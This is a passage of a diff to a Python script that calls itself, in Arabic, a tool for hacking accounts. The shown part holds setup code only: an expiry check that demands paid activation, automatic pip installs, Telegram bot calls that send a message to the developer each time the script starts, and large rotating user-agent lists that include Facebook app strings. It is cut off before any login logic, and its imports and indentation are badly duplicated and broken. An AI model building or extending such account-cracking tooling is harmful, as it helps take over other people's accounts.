@@ -1,88 +1,17 @@
 
-a2 = '\x1b[1;34m'  # أزرق
-a3 = '\x1b[1;32m'  # أخضر
-a4 = '\x1b[1;33m'  # أصفر
-a5 = '\x1b[38;5;208m'  # برتقالي
-a6 = '\x1b[38;5;5m'  # أرجواني
-a7 = '\x1b[38;5;13m'  # وردي
-a8 = '\x1b[1;30m'  # أسود
-a9 = '\x1b[1;37m'  # أبيض
-a10 = '\x1b[38;5;52m'  # بني
-a11 = '\x1b[38;5;8m'  # رمادي
-a12 = '\x1b[38;5;220m'  # ذهبي
-a13 = '\x1b[38;5;7m'  # فضي
-a14 = '\x1b[38;5;153m'  # أزرق فاتح
-a15 = '\x1b[38;5;18m'  # أزرق داكن
-a16 = '\x1b[38;5;48m'  # أخضر فاتح
-a17 = '\x1b[38;5;22m'  # أخضر داكن
-a18 = '\x1b[39;5;396m'  # أحمر فاتح
-a19 = '\x1b[38;5;88m'  # أحمر داكن
-a20 = '\x1b[38;5;226m'  # أصفر فاتح
-a21 = '\x1b[38;5;136m'  # أصفر داكن
-a22 = '\x1b[38;5;216m'  # برتقالي فات
-a23 = '\x1b[38;5;166m'  # برتقالي داكن
-a24 = '\x1b[38;5;234m'  # أرجواني فاتح
-a25 = '\x1b[38;5;91m'  # أرجواني داكن
-a26 = '\x1b[38;5;205m'  # وردي فاتح
-a27 = '\x1b[38;5;161m'  # وردي داكن
-a28 = '\x1b[38;5;236m'  # أسود فاتح
-a29 = '\x1b[38;5;233m'  # أسود داكن
-a30 = '\x1b[38;5;255m'  # أبيض فاتح
-a31 = '\x1b[38;5;231m'  # أبيض داكن
-a32 = '\x1b[38;5;180m'  # بني فاتح
-import requests,random
-import requests,random,os,uuid,json,user_agent,time,sys,socket,datetime
-from datetime import date
-from time import sleep
-from user_agent import generate_user_agent
-from uuid import uuid4
-from os import system
+import webbrowser
+import requests
+import bs4
+import json
 import os
 import sys
-import time
-import requests
-import requests,bs4,json,os,sys,random,datetime,time,re
-import urllib3,rich,base64
-from time import sleep
-from rich.table import Table as me
-from rich.console import Console as sol
-from bs4 import BeautifulSoup as sop
-from bs4 import BeautifulSoup as parser
-from concurrent.futures import ThreadPoolExecutor as tred
-from rich.console import Group as gp
-from rich.panel import Panel as nel
-from rich import print as cetak
-from rich.panel import Panel as Ch
-from rich import print as code
-from rich.markdown import Markdown as mark
-from rich.columns import Columns as col
-from rich import print as rprint
-from rich import pretty
-from rich.text import Text as tekz
 import random
-import os
-import sys
+import datetime
 import time
-import os,sys,time,json,random,re,string,platform,base64
-#mport requests,bs4,json,os,sys,random,datetime,time,re
-import urllib3,rich,base64
-from rich.table import Table as me
-from rich.console import Console as sol
-from bs4 import BeautifulSoup as sop
-from bs4 import BeautifulSoup as parser
-from concurrent.futures import ThreadPoolExecutor as tred
-from rich.console import Group as gp
-from rich.panel import Panel as nel
-from rich import print as cetak
-from rich.markdown import Markdown as mark
-from rich.columns import Columns as col
-from rich import print as rprint
-from rich import pretty
-from rich import print as SDMi
-from rich.text import Text as tekz
-import os
-import requests,bs4,json,os,sys,random,datetime,time,re
-import urllib3,rich,base64
+import re
+import urllib3
+import rich
+import base64
 from rich.table import Table as me
 from rich.console import Console as sol
 from bs4 import BeautifulSoup as sop
@@ -97,226 +26,67 @@ from rich import print as rprint
 from rich import pretty
 from rich.text import Text as tekz
 import os
-import webbrowser
-import webbrowser
-import requests,time,pyfiglet,datetime
-import time,sys
-import requests,bs4,json,os,sys,random,datetime,time,re
-import urllib3,rich,base64
-from rich.table import Table as me
-from rich.console import Console as sol
-from bs4 import BeautifulSoup as sop
-from bs4 import BeautifulSoup as parser
-from concurrent.futures import ThreadPoolExecutor as tred
-from rich.console import Group as gp
-from rich.panel import Panel as nel
-from rich import print as cetak
-from rich.markdown import Markdown as mark
-from rich.columns import Columns as col
-from rich import print as rprint
-from rich import pretty
-from rich.text import Text as tekz
-import os
-import requests,random
-import requests,random,os,uuid,json,user_agent,time,sys,socket,datetime
-from datetime import date
-from time import sleep
-from user_agent import generate_user_agent
-from uuid import uuid4
-from os import system
-import os
-import sys
-import time
-import requests
-time.sleep(1)
-#os.system('xdg-open ' + url)
-def chk():
-
-  os.system('clear')
-
-  
-  uuid = str(os.geteuid())
-  id = "111V"
-
-  try: 
-    #httpCaht = requests.get("https://pastebin.com/raw/vzSiuq8W").text
-    if "" == "":
-      
-      msg = str(os.geteuid())
-      time.sleep(2)
-      pass
-    else:
-        
-      SDMi("\033[0;96m")
- 
-
-      time.sleep(1) 
-
+now = datetime.datetime.today()
+now = datetime.datetime.today()
+mm = str(now.month)
+dd = str(now.day)
+yyyy = str(now.year)
+hour = str(now.hour)
+mi = str(now.minute)
+ss = str(now.second)
+t = mm + '/' + dd + '/' + yyyy + ' ' + hour + ':' + mi + ':' + ss
+hours = now.hour
+x = datetime.datetime.now()
+g = datetime.datetime(2023, 12, 30, 2, 0, 0)
+if x.strftime('%x') > g.strftime('%x'):
+     print('\n\n')
+     print('     تم توقيف اداة راسل المطور لتفعيله المدفوع @mx1mq')
+     print('\n\n')
+     print(x)
+     sys.exit(0)
+     if x.strftime('%x') == g.strftime('%x'):
+     	print('')
+     if x.strftime('%X') > g.strftime('%X'):
+         print('\n\n')
+         print('     انتهى وقت تفعيل الاداة للاشتراك المدفوع راسل المطور @mx1mq')
+         print('\n\n')
+         print(x)
+         sys.exit(0)
      
+     else:
+     	print('')
 
-  except: 
+try:
+    import rich
+except:
+    cetak(nel('\t• Sedang Menginstall Modul Rich •'))
+    os.system('pip install rich')
 
-    sys.exit() 
+try:
+    import stdiomask
+except:
+    cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))
+    os.system('pip install stdiomask')
 
-    if name == '__main__': 
-
-     SDMi (logo)
-
-     chk() 
-
-chk() 
-a1 = '\x1b[1;31m'  # أحمر
-a2 = '\x1b[1;34m'  # أزرق
-a3 = '\x1b[1;32m'  # أخضر
-a4 = '\x1b[1;33m'  # أصفر
-a5 = '\x1b[38;5;208m'  # برتقالي
-a6 = '\x1b[38;5;5m'  # أرجواني
-a7 = '\x1b[38;5;13m'  # وردي
-a8 = '\x1b[1;30m'  # أسود
-a9 = '\x1b[1;37m'  # أبيض
+try:
+    import requests
+except:
+    Z = '\x1b[1;31m'
+R = '\x1b[1;31m'
+X = '\x1b[1;33m'
+F = '\x1b[2;32m'
 C = '\x1b[1;97m'
-a10 = '\x1b[38;5;52m'  # بني
-a11 = '\x1b[38;5;8m'  # رمادي
-a12 = '\x1b[38;5;220m'  # ذهبي
-a13 = '\x1b[38;5;7m'  # فضي
-a14 = '\x1b[38;5;153m'  # أزرق فاتح
-a15 = '\x1b[38;5;18m'  # أزرق داكن
-a16 = '\x1b[38;5;48m'  # أخضر فاتح
-a17 = '\x1b[38;5;22m'  # أخضر داكن
-a18 = '\x1b[38;5;196m'  # أحمر فاتح
-a19 = '\x1b[38;5;88m'  # أحمر داكن
-a20 = '\x1b[38;5;226m'  # أصفر فاتح
-a21 = '\x1b[38;5;136m'  # أصفر داكن
-a22 = '\x1b[38;5;216m'  # برتقالي فات
-a23 = '\x1b[38;5;166m'  # برتقالي داكن
-a24 = '\x1b[38;5;234m'  # أرجواني فاتح
-a25 = '\x1b[38;5;91m'  # أرجواني داكن
-a26 = '\x1b[38;5;205m'  # وردي فاتح
-a27 = '\x1b[38;5;161m'  # وردي داكن
-a28 = '\x1b[38;5;236m'  # أسود فاتح
-a29 = '\x1b[38;5;233m'  # أسود داكن
-a30 = '\x1b[38;5;255m'  # أبيض فاتح
-a31 = '\x1b[38;5;231m'  # أبيض داكن
-a32 = '\x1b[38;5;180m'  # بني فاتح
-a33 = '\x1b[38;5;94m'  # بني داكن
-a34 = '\x1b[38;5;252m'  # رمادي فاتح
-a35 = '\x1b[38;5;246m'  # رمادي داكن
-a36 = '\x1b[38;5;228m'  # ذهبي فاتح
-a37 = '\x1b[38;5;172m'  # ذهبي داكن
-a38 = '\x1b[38;5;188m'  # فضي فاتح
-a39 = '\x1b[38;5;247m'  # فضي داكن
-a40 = '\x1b[38;5;117m'  # أزرق سماوي
+B = '\x1b[2;36m'
+Y = '\x1b[1;34m'
+E = '\x1b[1;31m'
+B = '\x1b[2;36m'
+G = '\x1b[1;32m'
+S = '\x1b[1;33m'
 
-Z = '\033[1;31m' 
-C = '\033[1;33m'
-Z1 = '\033[2;31m' 
-F = '\033[2;32m' 
-A = '\033[2;34m'
-B = '\033[2;36m'
-Y = '\033[1;34m'
-
-import requests,bs4,json,os,sys,random,datetime,time,re
-import urllib3,rich,base64
-from time import sleep
-from rich.table import Table as me
-from rich.console import Console as sol
-from bs4 import BeautifulSoup as sop
-from bs4 import BeautifulSoup as parser
-from concurrent.futures import ThreadPoolExecutor as tred
-from rich.console import Group as gp
-from rich.panel import Panel as nel
-from rich import print as cetak
-from rich.markdown import Markdown as mark
-from rich.columns import Columns as col
-from rich import print as rprint
-from rich import pretty
-from rich.text import Text as tekz
-import random
-import os
-import sys
-import time
-import os,sys,time,json,random,re,string,platform,base64
-#mport requests,bs4,json,os,sys,random,datetime,time,re
-import urllib3,rich,base64
-from rich.table import Table as me
-from rich.console import Console as sol
-from bs4 import BeautifulSoup as sop
-from bs4 import BeautifulSoup as parser
-from concurrent.futures import ThreadPoolExecutor as tred
-from rich.console import Group as gp
-from rich.panel import Panel as nel
-from rich import print as cetak
-from rich.markdown import Markdown as mark
-from rich.columns import Columns as col
-from rich import print as rprint
-from rich import pretty
-from rich.text import Text as tekz
-import os
-import requests,bs4,json,os,sys,random,datetime,time,re
-import urllib3,rich,base64
-from rich.table import Table as me
-from rich.console import Console as sol
-from bs4 import BeautifulSoup as sop
-from bs4 import BeautifulSoup as parser
-from concurrent.futures import ThreadPoolExecutor as tred
-from rich.console import Group as gp
-from rich.panel import Panel as nel
-from rich import print as cetak
-from rich.markdown import Markdown as mark
-from rich.columns import Columns as col
-from rich import print as rprint
-from rich import pretty
-from rich.text import Text as tekz
-import os
-import webbrowser
-import webbrowser
-import requests,time,pyfiglet,datetime
-import time,sys
-import requests,bs4,json,os,sys,random,datetime,time,re
-import urllib3,rich,base64
-from rich.table import Table as me
-from rich.console import Console as sol
-from bs4 import BeautifulSoup as sop
-from bs4 import BeautifulSoup as parser
-from concurrent.futures import ThreadPoolExecutor as tred
-from rich.console import Group as gp
-from rich.panel import Panel as nel
-from rich import print as cetak
-from rich.markdown import Markdown as mark
-from rich.columns import Columns as col
-from rich import print as rprint
-from rich import pretty
-from rich.text import Text as tekz
-import os
-try:
-        import rich
-except ImportError:
-        cetak(nel('\t• جـاࢪي التشـغيل انتظࢪ قليلاً... •'))
-        os.system('pip install rich')
-try:
-        import stdiomask
-except ImportError:
-        cetak(nel('\t• جـاࢪي التشـغيل انتظࢪ قليلاً... •'))
-        os.system('pip install stdiomask')
-try:
-	import requests
-except ImportError:
-	Z = '\033[1;31m' #احمر
-R = '\033[1;31m' #احمر
-X = '\033[1;33m' #اصفر
-F = '\033[2;32m' #اخضر
-C = "\033[1;97m" #ابيض
-B = '\033[2;36m'#سمائي
-Y = '\033[1;34m' #ازرق فاتح.
-E = '\033[1;31m'
-B = '\033[2;36m'
-G = '\033[1;32m'
-S = '\033[1;33m'
 try:
     from cfonts import render, say
 except:
     os.system('pip install python-cfonts')
-
 time1 = time.localtime()
 time2 = time.strftime('''%d/%m/%Y''')
 print('')
@@ -341,22 +111,39 @@ tlg1 = '\n -مرحبا بك في اداة لإختراق الحسابات الم
 requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(tlg1))
 requests.get('https://api.telegram.org/bot' + str(token1) + '/sendMessage?chat_id=' + str(ID1) + '&text=' + str(tlg1))
 os.system('clear')
-cetak(nel('t• Sedang Menginstall Modul Requests •'))
-
+os.system('clear')
+cetak(nel('\t• Sedang Menginstall Modul Requests •'))
 pretty.install()
-CON=sol()
-user_agent = ['Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36', 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.2; Trident/4.0)', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.117 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; rv:50.0) Gecko/20100101 Firefox/50.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Safari/537.36', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.3; Win64; x64; Trident/6.0)', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0)', 'Mozilla/5.0 (Windows NT 6.3; rv:49.0) Gecko/20100101 Firefox/49.0', 'Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64; rv:49.0) Gecko/20100101 Firefox/49.0', 'Mozilla/5.0 (Windows NT 6.3; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; rv:49.0) Gecko/20100101 Firefox/49.0', 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:51.0) Gecko/20100101 Firefox/51.0', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.120 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:49.0) Gecko/20100101 Firefox/49.0', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.78 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.120 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0', 'Mozilla/5.0 (Windows NT 6.3; rv:51.0) Gecko/20100101 Firefox/51.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Safari/537.36', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.2; Win64; x64; Trident/5.0)', 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0)', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:51.0) Gecko/20100101 Firefox/51.0', 'Mozilla/5.0 (X11; Linux i686; rv:49.0) Gecko/20100101 Firefox/49.0', 'Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.3; Win64; x64; Trident/4.0)', 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0)', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.2; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:50.0) Gecko/20100101 Firefox/50.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:51.0) Gecko/20100101 Firefox/51.0', 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0)', 'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.80 Safari/537.36', 'Mozilla/5.0 (X11; Linux i686; rv:49.0) Gecko/20100101 Firefox/49.0', 'Mozilla/5.0 (Windows NT 10.0; rv:51.0) Gecko/20100101 Firefox/51.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 10.0; Win64; x64; Trident/5.0)', 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.3; WOW64; Trident/4.0)', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0', 'Mozilla/5.0 (Windows NT 5.1; WOW64; Trident/7.0; rv:11.0) like Gecko', 'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:49.0) Gecko/20100101 Firefox/49.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.78 Safari/537.36', 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:51.0) Gecko/20100101 Firefox/51.0', 'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.78 Safari/537.36', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; Trident/6.0)', 'Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Safari/537.36', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.2; WOW64; Trident/5.0)', 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0)', 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0', 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.120 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.2; WOW64; Trident/7.0; rv:11.0) like Gecko', 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.3; Win64; x64; Trident/4.0)', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0', 'Mozilla/5.0 (Windows NT 6.2; WOW64; Trident/7.0; rv:11.0) like Gecko', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:48.0) Gecko/20100101 Firefox/48.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:48.0) Gecko/20100101 Firefox/48.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:51.0) Gecko/20100101 Firefox/51.0', 'Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.81 Safari/537.36', 'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:51.0) Gecko/20100101 Firefox/51.0', 'Mozilla/5.0 (Windows NT 5.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0', 'Mozilla/5.0 (Windows NT 5.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36', 'Mozilla/5.0 (X11; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36']
-ugen2=['Mozilla/5.0 (X11; Linux i686; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.96 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:51.0) Gecko/20100101 Firefox/51.0', 'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36', 'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.117 Safari/537.36', 'Mozilla/5.0 (X11; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.78 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64; rv:47.0) Gecko/20100101 Firefox/47.0']
-ugen=['Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0', 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36', 'Mozilla/5.0 (X11; Linux i686; rv:51.0) Gecko/20100101 Firefox/51.0']
+CON = sol()
+user_agent=['Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/84.0.4147.125 Safari/537.36','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.114 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.99 Safari/537.36', 'Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.80 Safari/537.36', 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0)', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/84.0.4147.89 Safari/537.36', 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.2; Trident/4.0)', 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0', 'Mozilla/5.0 (X11; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.83 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.110 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.101 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/84.0.4147.105 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:48.0) Gecko/20100101 Firefox/48.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:47.0) Gecko/20100101 Firefox/47.0', 'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:47.0) Gecko/20100101 Firefox/47.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.3; WOW64; Trident/5.0)', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 